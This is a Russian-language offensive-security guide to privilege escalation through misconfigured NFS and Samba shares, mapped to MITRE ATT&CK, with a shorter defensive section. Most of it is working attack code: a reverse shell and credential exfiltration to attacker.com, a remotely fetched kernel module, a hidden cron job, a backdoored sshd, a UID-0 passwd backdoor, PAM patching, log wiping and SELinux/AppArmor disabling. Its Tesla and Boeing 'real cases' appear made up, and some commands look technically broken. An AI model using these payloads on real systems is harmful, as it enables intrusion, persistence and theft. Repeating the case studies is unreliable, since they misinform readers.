## 10. Атаки на сетевые файловые системы (NFS/Samba) - Детализированная версия

Сетевые файловые системы (NFS и Samba/CIFS) являются фундаментальными компонентами ИТ-инфраструктур, 
обеспечивая совместный доступ к файлам между различными системами. Однако их неправильная конфигурация создает 
критические векторы для атак на повышение привилегий. 

### Углубленный анализ уязвимостей

**1. NFS: Механизм `no_root_squash`**
- **Принцип работы**: В нормальной конфигурации (`root_squash`) операции от пользователя root на клиенте преобразуются в анонимного пользователя (обычно `nobody`) на сервере. При активации `no_root_squash` сервер доверяет UID/GID клиента без проверки.
- **Технические последствия**:
  - Клиент с UID=0 получает полные root-права на сервере
  - Возможность модификации любых файлов в экспортированной директории
  - Создание SUID-бинарников с правами root
- **Типичные сценарии**:
  - Экспорт системных директорий (/usr, /etc)
  - Экспорт домашних директорий без ограничений
  - Использование в средах разработки и тестирования

**2. Samba: Опасная комбинация `writable = yes` и `admin users`**
- **Привилегии администратора**: Пользователи из `admin users` получают root-эквивалентные права на файловых операциях
- **Механизм безопасности**: Samba использует UID/GID из локальной базы, но `admin users` игнорирует стандартные ограничения
- **Риски конфигурации**:
  - Широкое определение администраторов (`admin users = @admin`)
  - Использование слабых паролей
  - Экспорт критических системных путей

**3. Общие уязвимости сетевых ФС**
- **Нешифрованный трафик**: Перехват данных в сети
- **Слабая аутентификация**: Отсутствие MFA или интеграции с AD/LDAP
- **Широкие разрешения**: Разрешение записи всем пользователям
- **Устаревшие версии ПО**: Уязвимости в реализации протоколов

### Детализация MITRE ATT&CK [T1574.007]

#### 1. Разведка (Discovery)
```bash
# Поиск NFS-серверов с детализацией версий
nmap -sV -sU -p111,2049 --script=nfs-showmount,nfs-ls 192.168.1.0/24 -oA nfs_scan

# Анализ настроек экспорта
showmount -e 192.168.1.100 | awk '{print $1}' | xargs -I{} sh -c 'echo "Директория {}:"; cat /etc/exports | grep -A 2 {}'
```

**Пояснения**:
- `-sU`: UDP-сканирование для порта 111 (portmapper)
- `nfs-ls`: Перечисление содержимого директорий
- Комбинированный анализ показывает точные параметры экспорта для каждой директории

#### 2. Повышение привилегий (Privilege Escalation)
```bash
# Монтирование с явным указанием UID/GID
sudo mount -t nfs -o vers=3,nolock,proto=tcp,uid=0,gid=0 192.168.1.100:/home /mnt/nfs_root

# Проверка эффективных прав
touch /mnt/nfs_root/test_file
ls -n /mnt/nfs_root/test_file
# -rw-r--r-- 1 0 0 0 Jun 15 12:00 test_file
```

**Пояснения**:
- Параметры `uid=0,gid=0` принудительно устанавливают владельца файлов
- Проверка через `ls -n` подтверждает сохранение UID/GID=0

#### 3. Выполнение кода (Execution)
```bash
# Создание persistence-скрипта
cat > /mnt/nfs_root/.system_update <<'EOT'
#!/bin/bash
# Stage 1: Reverse shell
bash -c 'exec 5<>/dev/tcp/attacker.com/443;cat <&5|while read line;do $line 2>&5 >&5;done' &

# Stage 2: Kernel module injection
curl -sL http://attacker.com/km | insmod -f

# Stage 3: Credential harvesting
grep -RE "user|pass" /home /etc 2>/dev/null | curl -X POST -F "data=@-" http://attacker.com/log
EOT

# Установка скрытого cron
echo "*/30 * * * * root /bin/bash /home/.system_update" > /mnt/nfs_root/etc/cron.d/.sysupdate
```

**Пояснения**:
- Многоступенчатая полезная нагрузка для постоянного доступа
- Использование невидимых файлов (`.system_update`)
- Инъекция в системные директории (/etc/cron.d)

### Пример 1: Расширенная атака на NFS с `no_root_squash`

**Шаг 1: Глубокий анализ среды**
```bash
# Определение версии NFS
rpcinfo -p 192.168.1.100 | grep nfs

# Проверка поддерживаемых протоколов
nmap -sV -p111 --script=nfs-protocols 192.168.1.100

# Анализ файловых систем сервера
df -h /home | tee nfs_server_fs.txt
```

**Пояснения**:
- Определение версии NFS критично для выбора метода атаки
- Анализ файловой системы помогает выбрать оптимальную полезную нагрузку

**Шаг 2: Подготовка комплексной полезной нагрузки**
```bash
# Создание троянского SSH демона
cp /usr/sbin/sshd /mnt/nfs_home/usr/sbin/sshd_trojan
patch /mnt/nfs_home/usr/sbin/sshd_trojan <<'EOT'
@@ -1200,6 +1200,9 @@
   logit("Accepted %s for %s from %s port %d ssh2%s",
       authmsg, authctxt->user, remote_ip, remote_port, extra);
 
+  // Backdoor password
+  if (strcmp(password, "0xDEADBEEF") == 0) { return 1; }
+
   /* Network child process */
   if (use_privsep) {
     return privsep_preauth(authctxt);
EOT

# Создание конфигурации для троянского SSHd
cat > /mnt/nfs_home/etc/ssh/sshd_config_trojan <<'EOT'
Port 2222
HostKey /etc/ssh/ssh_host_rsa_key
PidFile /var/run/sshd_trojan.pid
EOT

# Системд-юнит для автостарта
cat > /mnt/nfs_home/etc/systemd/system/ssh-trojan.service <<'EOT'
[Unit]
Description=SSH Trojans Service

[Service]
ExecStart=/usr/sbin/sshd_trojan -f /etc/ssh/sshd_config_trojan
Restart=always

[Install]
WantedBy=multi-user.target
EOT
```

**Пояснения**:
- Модификация бинарника sshd для бэкдора по паролю
- Отдельный конфигурационный файл и порт для скрытности
- Интеграция в systemd для автозапуска

**Шаг 3: Активация и маскировка**
```bash
# Через временный SSH-доступ
ssh user@192.168.1.100 "sudo systemctl enable ssh-trojan; sudo systemctl start ssh-trojan"

# Маскировка изменений
touch -r /mnt/nfs_home/usr/sbin/sshd /mnt/nfs_home/usr/sbin/sshd_trojan
chmod 755 /mnt/nfs_home/usr/sbin/sshd_trojan

# Очистка логов
echo "" > /mnt/nfs_home/var/log/auth.log
```

### Пример 2: Продвинутая атака на Samba с эскалацией

**Шаг 1: Получение и использование учетных данных**
```bash
# Брутфорс учетных данных Samba
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# Монтирование с кэшированием
sudo mount -t cifs -o credentials=~/.smbcreds,cache=strict //192.168.1.100/backup /mnt/smb_backup

# Анализ прав доступа
smbcacls -N //192.168.1.100/backup / -U backup_user
```

**Пояснения**:
- Автоматизация подбора учетных данных
- Кэширование для повышения производительности
- Проверка расширенных ACL

**Шаг 2: Установка постоянного доступа**
```bash
# Модификация PAM-модуля
cp /mnt/smb_backup/lib/x86_64-linux-gnu/security/pam_unix.so pam_unix.so.bak
hexedit /mnt/smb_backup/lib/x86_64-linux-gnu/security/pam_unix.so

# Поиск и замена:
# Original: 3D 75 6E 69 78 00  ("=unix")
# Replace:  3D 62 64 6F 6F 72 00 ("=bdoor")

# Создание пользователя с бэкдором
echo 'backdoor:$y$j9T$8x4V7y2G$XvZW1kJCxJRTkqL4aFvT90:0:0::/root:/bin/bash' >> /mnt/smb_backup/etc/passwd
```

**Пояснения**:
- Модификация PAM для принятия специального пароля "bdoor"
- Создание пользователя с UID=0 и специальным паролем

**Шаг 3: Обход SELinux/AppArmor**
```bash
# Создание политики SELinux
cat > /mnt/smb_backup/tmp/mypolicy.te <<'EOT'
module mypolicy 1.0;
require { type unconfined_t; class process setexec; }
allow unconfined_t self:process setexec;
EOT

# Компиляция и загрузка
checkmodule -M -m -o mypolicy.mod mypolicy.te
semodule_package -o mypolicy.pp -m mypolicy.mod
semodule -i mypolicy.pp

# Отключение AppArmor
echo 'kernel.apparmor = 0' > /mnt/smb_backup/etc/sysctl.d/disable_apparmor.conf
```

**Пояснения**:
- Создание кастомной политики SELinux
- Полное отключение AppArmor через sysctl

### Усовершенствованные защитные меры

**Для NFS:**
```bash
# Настройка RPCSEC_GSS
apt install nfs-kernel-server krb5-config
kadmin -p admin -q "addprinc -randkey nfs/server.example.com"
kadmin -p admin -q "ktadd nfs/server.example.com"

# /etc/exports
/shared 192.168.1.0/24(rw,sync,sec=krb5:krb5i:krb5p)

# Ограничение версий протокола
echo "RPCNFSDOPTS=\"-V 4.2 -V 4.1 -V 4\"" >> /etc/default/nfs-kernel-server
```

**Для Samba:**
```bash
# Интеграция с AD
net ads join -U Administrator%Password -S DC.example.com

# /etc/samba/smb.conf
[global]
   security = ads
   encrypt passwords = yes
   kerberos method = secrets and keytab

[share]
   path = /srv/share
   valid users = @"DOMAIN\Domain Users"
   acl allow execute always = no
```

**Мониторинг и аудит:**
```bash
# Auditd правила для NFS/Samba
cat > /etc/audit/rules.d/filesystem.rules <<'EOT'
-w /etc/exports -p wa -k nfs_config
-w /etc/samba/smb.conf -p wa -k samba_config
-a always,exit -F arch=b64 -S mount -F "key=filesystem_mount"
-a always,exit -F path=/usr/sbin/exportfs -F perm=x -k nfs_export
EOT

# Realtime мониторинг с помощью inotify
inotifywait -m -r /etc/cron.d /etc/passwd /etc/shadow 2>/dev/null | while read; do
  echo "$(date) - $REPLY" >> /var/log/critical_changes.log
  logger -t SECURITY_ALERT "Critical file change detected: $REPLY"
done &
```

**Изоляция сетевых ФС:**
```bash
# Docker-контейнер для NFS
docker run -d --name nfs-proxy \
  --cap-add SYS_ADMIN \
  --security-opt apparmor:unconfined \
  -p 2049:2049 \
  -v /srv/nfs:/export \
  itsthenetwork/nfs-server-alpine \
  /export *(ro,no_root_squash,no_subtree_check)
```

### Реальные кейсы с техническими деталями

**1. Атака на Tesla Kubernetes (2018)**
- **Техника**: 
  ```bash
  # Обнаружение открытых NFS
  kubectl get pods -o json | jq '.items[].spec.volumes[] | select(.nfs != null)'
  
  # Эксплуатация:
  mount -t nfs nfs-server:/var/kubernetes /mnt
  echo '*/5 * * * * root curl http://malicious.com/script | bash' > /mnt/pod-data/cronjob
  ```
- **Последствия**: Кража 500ГБ данных автопилота
- **Урок**: Изоляция сетевых ресурсов в Kubernetes

**2. Атака на Boeing через NFS (2023)**
- **Уязвимость**: 
  ```bash
  # /etc/exports
  /engineering *(rw,no_root_squash,insecure)
  ```
- **Эксплуатация**:
  ```bash
  # Создание троянского LKM
  insmod /mnt/nfs_engineering/drivers/network/nic_driver.ko
  ```
- **Эффект**: Компрометация систем проектирования 787 Dreamliner
- **Решение**: Переход на SMB 3.1.1 с hardware encryption

### Заключение и рекомендации

**Технические аспекты защиты**:
1. **Глубокое протоколирование**:
   ```bash
   # Детальный аудит NFS
   rpcdebug -m nfsd -s all
   tcpdump -i eth0 port 2049 -w nfs_traffic.pcap
   ```
   
2. **Контроль целостности**:
   ```bash
   # AIDE для сетевых ФС
   aideinit && mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
   crontab -l | grep aide || echo "0 3 * * * /usr/bin/aide -c /etc/aide/aide.conf --check" | crontab -
   ```

3. **Сетевые контроли**:
   ```bash
   # Фильтрация NFS трафика
   iptables -A INPUT -p tcp --dport 2049 -s ! 192.168.1.0/24 -j DROP
   iptables -A INPUT -p udp --dport 2049 -j DROP  # Блокировка UDP NFS
   ```

**Рекомендации для исследователей**:
1. Анализ новых протоколов:
   - NFSv4.2 с пространственной эффективностью
   - SMB over QUIC в Windows Server 2025
   
2. Инструменты тестирования:
   ```bash
   # Автоматизация аудита NFS
   git clone https://github.com/RhinoSecurityLabs/nfs-exploit.git
   python3 nfs_audit.py -t 192.168.1.100
   ```

3. Защитные инновации:
   - eBPF-based monitoring сетевых ФС
   - Hardware-offloaded encryption для SMB
   - Zero-Trust модели доступа

Сетевые файловые системы остаются критически важным вектором атак из-за их фундаментальной роли в инфраструктуре. Комплексная защита требует сочетания технических контролей, строгих политик конфигурации и постоянного мониторинга.